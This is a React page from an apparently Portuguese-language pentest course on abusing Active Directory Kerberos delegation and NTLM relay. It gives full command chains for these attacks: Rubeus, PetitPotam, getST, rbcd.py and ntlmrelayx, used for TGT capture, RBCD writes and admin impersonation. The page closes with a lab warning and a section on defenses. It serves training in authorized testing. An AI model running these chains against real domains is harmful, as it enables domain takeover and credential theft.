import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Delegacoes() {
  return (
    <PageContainer
      title="Delegações AD + NTLM relay"
      subtitle="Delegação irrestrita, restrita, RBCD e como o relay de NTLM transforma coerção em comprometimento"
      difficulty="avancado"
      timeToRead="26 min"
    >
      <h2>Por que delegação é perigosa</h2>
      <p>
        <strong>Delegação Kerberos</strong> existe para um serviço agir
        <em> em nome do usuário</em> (o servidor web acessa o banco como você).
        Configurada errado, ela permite que uma máquina ou conta comprometida
        <strong> se passe por qualquer usuário</strong>, inclusive Domain Admin.
      </p>
      <AlertBox type="warning" title="Lab / autorização">
        Todas as técnicas comprometem um domínio real. Pratique no seu AD de
        laboratório ou em engajamento contratado.
      </AlertBox>

      <h2>1. Enumerar delegações</h2>
      <CommandTable
        title="Achar contas delegadas"
        variations={[
          { cmd: "findDelegation.py corp.local/joao:'P@ss'", desc: "Impacket: lista todas as delegações do domínio" },
          { cmd: "Get-DomainComputer -Unconstrained (PowerView)", desc: "Contas com delegação irrestrita" },
          { cmd: "bloodhound-python -c All -u joao -p 'P@ss' -d corp.local", desc: "Mapeia caminhos de delegação no BloodHound" },
        ]}
      />

      <h2>2. Delegação irrestrita (Unconstrained)</h2>
      <p>
        A máquina guarda o <strong>TGT de quem se autentica nela</strong>. Se
        você controla um host irrestrito e coage o DC a se autenticar, captura o
        TGT do <code>DC$</code> e faz DCSync.
      </p>
      <PracticeBox
        title="Unconstrained + coerção do DC"
        goal="Capturar o TGT do controlador de domínio"
        command={`# 1. monitora tickets no host irrestrito comprometido
Rubeus.exe monitor /interval:5 /nowrap
# 2. coage o DC a autenticar em voce
python3 PetitPotam.py <SEU_IP> <IP_DC>
# 3. extrai o TGT capturado e usa
Rubeus.exe ptt /ticket:<base64_do_TGT_do_DC>`}
        expected="TGT do DC$ na sessão → DCSync do krbtgt"
        verify="secretsdump com o ticket recupera o hash do krbtgt"
      />

      <h2>3. Delegação restrita (Constrained)</h2>
      <p>
        A conta pode delegar só para <em>serviços específicos</em>
        (<code>msDS-AllowedToDelegateTo</code>). Com o hash dessa conta, use
        <strong> S4U2Self + S4U2Proxy</strong> para pedir um ticket como admin
        para o serviço alvo — e o protocol transition permite trocar o SPN.
      </p>
      <CodeBlock
        language="bash"
        code={`# getST do Impacket faz S4U completo
getST.py -spn cifs/servidor.corp.local \\
  -impersonate administrator \\
  -hashes :<NThash_da_conta> corp.local/svc_web
# exporta o ccache e usa
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass servidor.corp.local`}
      />
      <AlertBox type="info" title="Truque do SPN">
        Com protocol transition você pode <strong>trocar o serviço</strong> no
        ticket (ex.: de <code>time/</code> para <code>cifs/</code>), ampliando o
        que consegue fazer no alvo.
      </AlertBox>

      <h2>4. RBCD — Resource-Based Constrained Delegation</h2>
      <p>
        A delegação é definida <em>no alvo</em>
        (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>). Se você tem
        escrita nesse atributo do computador alvo, aponta para uma conta que
        controla e se passa por qualquer um contra aquele host.
      </p>
      <PracticeBox
        title="RBCD do zero"
        goal="Escrever RBCD e impersonar admin no alvo"
        command={`# 1. cria uma conta de maquina que voce controla (MAQ padrao 10)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss123' corp.local/joao:'P@ss'
# 2. escreve o RBCD no alvo
rbcd.py -delegate-from 'EVIL$' -delegate-to 'ALVO$' -action write corp.local/joao:'P@ss'
# 3. S4U para impersonar admin
getST.py -spn cifs/alvo.corp.local -impersonate administrator corp.local/'EVIL$':'P@ss123'`}
        expected="Ticket de admin para o ALVO$; acesso SMB/WMI como DA local"
        verify="wmiexec -k no alvo executa comando como administrator"
      />

      <h2>5. NTLM relay</h2>
      <p>
        NTLM relay pega uma autenticação que você <strong>captura ou coage</strong>
        e a <strong>reenvia</strong> para outro serviço onde aquela identidade
        tem poder — sem nunca quebrar a senha. Combina com coerção
        (PetitPotam/Coercer) e com ADCS (ESC8).
      </p>
      <CommandTable
        title="ntlmrelayx — alvos comuns"
        variations={[
          { cmd: "ntlmrelayx.py -t ldap://dc --delegate-access", desc: "Relay para LDAP: cria conta e configura RBCD automaticamente" },
          { cmd: "ntlmrelayx.py -t smb://alvo -c 'comando'", desc: "Relay para SMB e executa comando" },
          { cmd: "ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -template DomainController", desc: "Relay para ADCS (ESC8) → cert do alvo" },
          { cmd: "ntlmrelayx.py -t ldaps://dc --shadow-credentials", desc: "Relay LDAPS + shadow credentials na conta alvo" },
        ]}
      />
      <PracticeBox
        title="Coerção + relay para LDAP (RBCD automático)"
        goal="Do PetitPotam ao takeover do computador coagido"
        command={`# terminal 1: relay para LDAP pedindo delegate-access
ntlmrelayx.py -t ldap://10.0.0.10 --delegate-access --no-dump
# terminal 2: coage uma maquina a autenticar em voce
python3 PetitPotam.py <SEU_IP> <IP_ALVO>
# o ntlmrelayx cria EVIL$ e escreve RBCD; depois S4U:
getST.py -spn cifs/alvo.corp.local -impersonate administrator corp.local/'EVIL$':'senha'`}
        expected="RBCD configurado via relay; ticket de admin para o alvo"
        verify="Acesso privilegiado ao host coagido"
      />
      <AlertBox type="danger" title="Coerção de autenticação">
        <code>PetitPotam</code> (MS-EFSRPC), <code>Coercer</code>,
        <code> PrinterBug</code> (MS-RPRN) e <code>DFSCoerce</code> forçam uma
        máquina a autenticar no seu host — o gatilho da maioria dos relays.
      </AlertBox>

      <h2>Defesa</h2>
      <OutputBlock type="success" label="Fechando delegação e relay">
        <p><strong>Elimine delegação irrestrita</strong>; marque contas sensíveis como “Account is sensitive and cannot be delegated”.</p>
        <p><strong>Restrinja quem cria contas de máquina</strong> (MachineAccountQuota = 0) para matar RBCD fácil.</p>
        <p><strong>Assine SMB e LDAP</strong> (SMB signing, LDAP channel binding + signing) para quebrar o relay.</p>
        <p><strong>Habilite EPA</strong> nos endpoints HTTP (ADCS, Exchange).</p>
        <p><strong>Bloqueie a coerção</strong>: patch de PetitPotam, desabilitar spooler onde não é preciso.</p>
        <p><strong>Monitore</strong> escrita em msDS-AllowedToActOnBehalfOfOtherIdentity e criação de contas de máquina.</p>
      </OutputBlock>
    </PageContainer>
  );
}
